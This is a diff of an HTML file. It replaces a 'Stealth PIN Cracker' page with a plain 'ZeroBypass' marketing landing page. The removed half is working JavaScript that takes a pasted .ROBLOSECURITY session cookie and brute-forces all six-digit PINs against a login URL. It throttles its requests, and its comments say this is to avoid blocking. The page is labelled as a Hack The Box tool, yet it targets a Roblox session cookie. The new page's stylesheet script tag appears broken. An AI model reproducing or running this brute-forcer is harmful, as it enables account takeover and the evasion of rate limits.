@@ -2,105 +2,74 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>HTB Stealth PIN Cracker</title>
-    <style>
-        body { font-family: monospace; background: #0a0a0a; color: #00ff00; padding: 40px; text-align: center; }
-        .panel { max-width: 450px; margin: 0 auto; background: #111; padding: 25px; border: 2px solid #00ff00; border-radius: 5px; box-shadow: 0 0 15px rgba(0,255,0,0.2); }
-        input { width: 100%; padding: 12px; background: #000; color: #00ff00; border: 1px solid #00ff00; margin: 10px 0; box-sizing: border-box; font-family: monospace; font-size: 14px; text-align: center; }
-        .row { display: flex; justify-content: space-between; margin: 10px 0; gap: 10px; }
-        .row div { width: 50%; text-align: left; }
-        button { width: 100%; padding: 12px; background: #00ff00; color: #000; border: none; font-weight: bold; cursor: pointer; font-size: 16px; font-family: monospace; letter-spacing: 1px; margin-top: 10px; }
-        button:disabled { background: #222; color: #444; cursor: not-allowed; border: 1px solid #333; }
-        #console { height: 180px; overflow-y: auto; background: #000; border: 1px solid #00ff00; margin-top: 20px; padding: 10px; font-size: 12px; text-align: left; white-space: pre-wrap; }
-    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ZeroBypass | Absolute Isolation</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://jsdelivr.net"></script>
 </head>
-<body>
+<body class="bg-black text-white selection:bg-white selection:text-black antialiased min-h-screen flex flex-col justify-between p-6 md:p-12 font-sans">
 
-<div class="panel">
-    <h2>[ STEALTH PIN CRACKER ]</h2>
-    
-    <input type="text" id="cookieData" placeholder="PASTE .ROBLOSECURITY COOKIE HERE">
-    
-    <div class="row">
-        <div>
-            <label>Start PIN:</label>
-            <input type="number" id="startPin" value="0" min="0" max="999999">
-        </div>
-        <div>
-            <label>Delay (ms):</label>
-            <input type="number" id="delayMs" value="150" min="10">
-        </div>
-    </div>
+    <!-- Top Centered Header -->
+    <header class="w-full flex justify-center py-6 border-b border-zinc-800">
+        <h1 class="text-xl font-black tracking-[0.3em] uppercase text-white hover:text-zinc-400 transition-colors cursor-default">
+            ZeroBypass
+        </h1>
+    </header>
 
-    <button id="actionBtn" onclick="startStealthAttack()">START PROCESS</button>
-    <div id="console">[*] System idle. Awaiting cookie input...</div>
-</div>
-
-<script>
-let isRunning = false;
-
-// ========================================================
-// REPLACEMENT CONFIGURATION
-// ========================================================
-const TARGET_URL = "http://10.10.10.x/login"; 
-// ========================================================
-
-function log(msg) {
-    const con = document.getElementById('console');
-    con.innerText += msg + "\n";
-    con.scrollTop = con.scrollHeight;
-}
-
-async function startStealthAttack() {
-    if (isRunning) return;
-    
-    const cookieVal = document.getElementById('cookieData').value.trim();
-    let currentPin = parseInt(document.getElementById('startPin').value) || 0;
-    const delay = parseInt(document.getElementById('delayMs').value) || 150;
-
-    if (!cookieVal) {
-        alert("Error: Please provide a valid cookie.");
-        return;
-    }
-
-    // Set cookie explicitly inside your browser environment
-    document.cookie = `.ROBLOSECURITY=${cookieVal}; path=/; domain=${window.location.hostname}; SameSite=Lax`;
-
-    isRunning = true;
-    document.getElementById('actionBtn').disabled = true;
-    document.getElementById('console').innerText = "[*] Stealth parameters initialized.\n[*] Traffic throttling activated...\n";
-
-    while (isRunning && currentPin <= 999999) {
-        const paddedPin = String(currentPin).padStart(6, '0');
+    <!-- Main Content Body -->
+    <main class="max-w-4xl w-full mx-auto my-auto py-16 space-y-16">
         
-        if (currentPin % 10 === 0) {
-            log(`[-] Testing PIN: ${paddedPin} (Status: Sending)`);
-        }
+        <!-- Hero Section -->
+        <section class="text-center space-y-6">
+            <p class="text-xs uppercase tracking-[0.4em] text-zinc-500 font-semibold">
+                System Protocol Active
+            </p>
+            <h2 class="text-4xl md:text-6xl font-normal tracking-tight leading-none">
+                Security through absolute network isolation.
+            </h2>
+            <div class="pt-4">
+                <button class="bg-white text-black text-xs font-bold uppercase tracking-widest px-8 py-4 rounded-none hover:bg-zinc-200 transition-all duration-300 transform hover:scale-[1.02] cursor-pointer">
+                    Initialize Access
+                </button>
+            </div>
+        </section>
 
-        try {
-            // Using standard credential pass-through without standard cross-origin blockers
-            await fetch(TARGET_URL, {
-                method: "POST",
-                mode: "no-cors",
-                headers: {
-                    "Content-Type": "application/x-www-form-urlencoded"
-                },
-                body: `pin=${paddedPin}`
-            });
-        } catch (e) {
-            log(`[!] Connection choked on PIN ${paddedPin}. Retrying next...`);
-        }
+        <!-- Feature Grid -->
+        <section class="grid grid-cols-1 md:grid-cols-3 gap-px bg-zinc-800 border border-zinc-800">
+            <!-- Feature 1 -->
+            <div class="bg-black p-8 space-y-4 hover:bg-zinc-950 transition-colors group">
+                <span class="block text-xs font-mono text-zinc-600 group-hover:text-white transition-colors">01</span>
+                <h3 class="text-lg font-medium tracking-tight text-zinc-200">Absolute Security</h3>
+                <p class="text-sm text-zinc-500 leading-relaxed">Zero entry points. Complete data isolation.</p>
+            </div>
+            <!-- Feature 2 -->
+            <div class="bg-black p-8 space-y-4 hover:bg-zinc-950 transition-colors group">
+                <span class="block text-xs font-mono text-zinc-600 group-hover:text-white transition-colors">02</span>
+                <h3 class="text-lg font-medium tracking-tight text-zinc-200">High Velocity</h3>
+                <p class="text-sm text-zinc-500 leading-relaxed">Edge network execution with sub-millisecond response.</p>
+            </div>
+            <!-- Feature 3 -->
+            <div class="bg-black p-8 space-y-4 hover:bg-zinc-950 transition-colors group">
+                <span class="block text-xs font-mono text-zinc-600 group-hover:text-white transition-colors">03</span>
+                <h3 class="text-lg font-medium tracking-tight text-zinc-200">Immutable Logs</h3>
+                <p class="text-sm text-zinc-500 leading-relaxed">Cryptographically verified transaction tracking.</p>
+            </div>
+        </section>
 
-        currentPin++;
-        // Dynamic throttle delay keeping browser context safe from packet flooding blocks
-        await new Promise(resolve => setTimeout(resolve, delay));
-    }
+    </main>
 
-    log("\n[-] Session run complete or paused.");
-    isRunning = false;
-    document.getElementById('actionBtn').disabled = false;
-}
-</script>
+    <!-- Footer -->
+    <footer class="w-full max-w-4xl mx-auto border-t border-zinc-900 pt-6 flex flex-col sm:flex-row items-center justify-between text-[10px] font-mono tracking-widest text-zinc-600 uppercase gap-4">
+        <div>© <span id="year"></span> ZeroBypass. All rights reserved.</div>
+        <div class="flex gap-6">
+            <a href="#status" class="hover:text-white transition-colors">System: Operational</a>
+            <a href="#terms" class="hover:text-white transition-colors">Terms</a>
+        </div>
+    </footer>
 
+    <!-- Script to dynamically update year -->
+    <script>
+        document.getElementById('year').textContent = new Date().getFullYear();
+    </script>
 </body>
 </html>
